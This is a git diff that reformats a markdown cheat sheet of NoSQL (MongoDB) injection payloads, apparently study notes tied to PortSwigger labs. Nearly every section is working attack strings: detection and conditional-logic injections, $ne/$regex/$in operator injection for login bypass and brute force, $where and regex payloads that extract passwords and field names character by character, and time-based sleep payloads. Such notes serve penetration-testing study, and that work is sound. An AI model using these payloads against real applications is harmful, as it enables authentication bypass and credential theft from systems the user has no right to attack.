@@ -1,42 +1,48 @@
-# Table of Contents
+### Table of Contents
 
-1. [Basic Operator Difference Between SQLi And NoSQLi](#basic-operator-difference-between-sqli-and-nosqli)
+1. [Basic Operator Difference Between SQLi and NoSQLi](#basic-operator-difference-between-sqli-and-nosqli)
 2. [Detecting NoSQLi Vulnerability](#detecting-nosqli-vulnerability)
 3. [NoSQL Operator Injection](#nosql-operator-injection)
 4. [Submitting Query Operators](#submitting-query-operators)
 5. [MongoDB Login Bypass](#mongodb-login-bypass)
 6. [MongoDB Data Retrieving](#mongodb-data-retrieving)
-7. [Operator Injection to Retrieving Unknown Data](#operator-injection-to-retrieving-unknown-data)
+7. [Operator Injection to Retrieve Unknown Data](#operator-injection-to-retrieve-unknown-data)
 8. [Time-Based NoSQL Injection](#time-based-nosql-injection)
+
 ---
 
-### Basic operator difference between SQLi and NoSQLi
-  1. `or` >> `||`
-  2. `and` >> `&&`
-  3. `-- -` >> `%00`
+### Basic Operator Difference Between SQLi and NoSQLi
+
+- **`or`** → **`||`**
+- **`and`** → **`&&`**
+- **`-- -`** → **`%00`**
+
 ---
+
 ### Detecting NoSQLi Vulnerability
-**For MongoDB Detection:**
+
+#### For MongoDB Detection:
 ```
 '%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
 ```
-**Causing syntax error in MongoDB**
+#### Causing Syntax Error in MongoDB:
 ```
 '
 ```
-**Escaping the syntax error in MongoDB**
+#### Escaping the Syntax Error in MongoDB:
 ```
 \'
 ```
-Or we can try,
+Or we can try:
 ```
 %00
 ```
-**Injecting in JSON Format**
+#### Injecting in JSON Format:
 ```
 '\"`{\r;$Foo}\n$Foo \\xYZ\u0000
 ```
-**Others :**
+
+#### Others:
 ```
 '+%26%26+1%3d%3d1%00
 '+||+1%3d%3d1%00
@@ -46,7 +52,11 @@ Or we can try,
 admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
 admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
 ```
-### Confirming conditional behavior
+
+---
+
+### Confirming Conditional Behavior
+
 ```
 ' && 0 && 'x
 ' && 1 && 'x
@@ -54,110 +64,134 @@ admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
 '||'1'=='1
 '%00
 ```
-**Example with explanation :**
 
-  1. ```category=Gifts' && 0 && 'x``` >> This will return no items like ```category=Gifts' and 1=0-- -``` in sql injection.
-  2. ```category=Gifts' && 1 && 'x``` >> This will return Gift items like ```category=Gifts' and 1=1-- -``` in sql injection.
-  3. ```category=Gifts' || 1 || 'x``` >> This will return all the items like ```category=Gifts' or 1=1-- -``` in sql injection.
-  4. Same as 3.
-### NoSQL operator injection
+**Example with Explanation:**
 
-`$where` - Matches documents that satisfy a JavaScript expression.
-<br>
-`$ne` - Matches all values that are not equal to a specified value.
-<br>
-`$in` - Matches all of the values specified in an array.
-<br>
-`$regex` - Selects documents where values match a specified regular expression.
-<br>
-<br>
-Details: [Portswigger](https://portswigger.net/web-security/nosql-injection#nosql-operator-injection)
+1. ```category=Gifts' && 0 && 'x``` → This will return no items like ```category=Gifts' and 1=0-- -``` in SQL injection.
+2. ```category=Gifts' && 1 && 'x``` → This will return Gift items like ```category=Gifts' and 1=1-- -``` in SQL injection.
+3. ```category=Gifts' || 1 || 'x``` → This will return all the items like ```category=Gifts' or 1=1-- -``` in SQL injection.
+4. Same as 3.
 
-### Submitting query operators
-In JSON messages, you can insert query operators as nested objects. For example, `{"username":"wiener"}` becomes `{"username":{"$ne":"invalid"}}`.
-<br>
-<br>
+---
+
+### NoSQL Operator Injection
+
+- **`$where`** - Matches documents that satisfy a JavaScript expression.
+- **`$ne`** - Matches all values that are not equal to a specified value.
+- **`$in`** - Matches all of the values specified in an array.
+- **`$regex`** - Selects documents where values match a specified regular expression.
+
+For more details: [Portswigger](https://portswigger.net/web-security/nosql-injection#nosql-operator-injection)
+
+---
+
+### Submitting Query Operators
+
+In **JSON** messages, you can insert query operators as nested objects. For example, `{"username":"wiener"}` becomes `{"username":{"$ne":"invalid"}}`.
+
 For URL-based inputs, you can insert query operators via URL parameters. For example, `username=wiener` becomes `username[$ne]=invalid`.
-<br>
-<br>
-If this doesn't work, you can try the following:
-<br>
-<br>
-  `1.` Convert the request method from `GET` to `POST`.
-  <br>
-  `2.` Change the `Content-Type` header to `application/json`.
-  <br>
-  `3.` Add `JSON` to the `message body`.
-  <br>
-  `4.` Inject `query` operators in the `JSON`.
-### MongoDB Login Bypass
-```
-{"$regex":"wien.*"} >> For username
-{"$ne":"Invalid"} >> For password
-{"$in":["admin","administrator","superadmin"]} >> For bruteforce
-```
-![Screenshot from 2024-07-12 03-55-31](https://github.com/user-attachments/assets/18902009-c2d8-4162-b5d8-7ebb221fd49e)
-<br>
-Note: We need to input atleast one valid credential to make a valid query.
-<br>
+
 If this doesn't work, you can try the following:
 
-    1. Convert the request method from GET to POST.
-    2. Change the Content-Type header to application/json.
-    3. Add JSON to the message body.
-    4. Inject query operators in the JSON.
+1. Convert the request method from `GET` to `POST`.
+2. Change the `Content-Type` header to `application/json`.
+3. Add JSON to the message body.
+4. Inject query operators in the JSON.
+
+---
+
+### MongoDB Login Bypass
+
+- `{"$regex":"wien.*"}` → For username
+- `{"$ne":"Invalid"}` → For password
+- `{"$in":["admin","administrator","superadmin"]}` → For brute force
+
+![MongoDB Login Bypass Screenshot](https://github.com/user-attachments/assets/18902009-c2d8-4162-b5d8-7ebb221fd49e)
+
+Note: We need to input at least one valid credential to make a valid query.
+
+If this doesn't work, you can try the following:
+
+1. Convert the request method from `GET` to `POST`.
+2. Change the `Content-Type` header to `application/json`.
+3. Add JSON to the message body.
+4. Inject query operators in the JSON.
+
+---
+
 ### MongoDB Data Retrieving
-Extracting Password:
+
+**Extracting Password:**
 ```
-' && this.password.length < 50%00 >> For extracting password length in URL
-' && this.password[0] == 'a'%00 >> For extracting password in URL
-{"username":"admin","password":{"$regex":"^a*"}} >> For extracting password via operator
+' && this.password.length < 50%00 → For extracting password length in URL
+' && this.password[0] == 'a'%00 → For extracting password in URL
+{"username":"admin","password":{"$regex":"^a*"}} → For extracting password via operator
 ```
-### Identifying field names
+
+---
+
+### Identifying Field Names
+
 ```
-' && this.anything && 'a'=='b >> Confirming if there is a field name
-' && this.username!=' >> Identifying field names [Note: If there is a username field exists, it will response with different type of message]
-' && this['u'] && 'a'=='b >> Retrieving field name character by character
+' && this.anything && 'a'=='b → Confirming if there is a field name
+' && this.username!=' → Identifying field names [Note: If there is a username field exists, it will respond with a different type of message]
+' && this['u'] && 'a'=='b → Retrieving field name character by character
 ' && this.u.s.e.r.n.a.m['e'] && 'a'=='b
 ```
-### Operator Injection To Retrieving Unknown Data
+
+---
+
+### Operator Injection to Retrieve Unknown Data
+
 ```
 {"username":{"$regex":"admin"},"password":{"$ne":"Invalid"}}
-{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"e"} >> To generate an server error.
-{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"0"} >> To generate a false statement.
-{"username":{"$regex":"admin"},"password":{"$ne":"Invalid","$where":"1"}} >> To generate a true statement.
-{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"0"}  >>  {"username":{"$regex":"admin"},"password":{"$ne":"Invalid","$where":"Object.keys(this)[0].match('^.{0}.*')"}}
-{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"0"}  >>  {"username":{"$regex":"admin"},"password":{"$ne":"Invalid","$where":"Object.keys(this)[0].match('^.{0}0.*')"}}
-
-Object.keys(this)[0].match('^.{0}.*') >> To identify data size. Ex: Password
-Object.keys(this)[0].match('^.{0}0.*') >> To fetch the data
-this.forgotpwd.match('^.{0}.*') >> To fetch specific keyvalue data size.
-this.forgotpwd.match('^.{0}0.*') >> To fetch specific keyvalue.
-
-1st 0 means key number
-2nd 0 means data size
-3rd 0 means data character
-For bruteforcing select only 2nd and 3rd 0
+{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"e"}  → To generate a server error.
+{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"0"}  → To generate a false statement.
+{"username":{"$regex":"admin"},"password":{"$ne":"Invalid","$where":"1"}}  → To generate a true statement.
+{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"0"}  
+{"username":{"$regex":"admin"},"password":{"$ne":"Invalid","$where":"Object.keys(this)[0].match('^.{0}.*')"}}
+{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"0"}  
+{"username":{"$regex":"admin"},"password":{"$ne":"Invalid","$where":"Object.keys(this)[0].match('^.{0}0.*')"}}
 ```
-### Time based NoSQL Injection
+
+**Key Details:**
+- `Object.keys(this)[0].match('^.{0}.*')` → To identify data size (e.g., Password).
+- `Object.keys(this)[0].match('^.{0}0.*')` → To fetch the data.
+- `this.forgotpwd.match('^.{0}.*')` → To fetch specific key-value data size.
+- `this.forgotpwd.match('^.{0}0.*')` → To fetch specific key-value data.
+
+1st `0` means key number.  
+2nd `0` means data size.  
+3rd `0` means data character.  
+For brute forcing, select only 2nd and 3rd `0`.
+
+---
+
+### Time-Based NoSQL Injection
+
 ```
 {
   "username": "admin",
   "password": { "$where": "sleep(5000)" }
 }
 ```
+
 **Data Retrieve**
-Initial Request
+
+- **Initial Request:**
 ```
 {
   "product": "Tablet",
   "price": 350,
 }
 ```
-Malformed Request
+
+- **Malformed Request:**
 ```
 {
   "product": { "$eq": "Tablet" },
   "price": { "$where": "if (this.price > 300) { sleep(5000); return true; } return false;" }
 }
 ```
+
+---
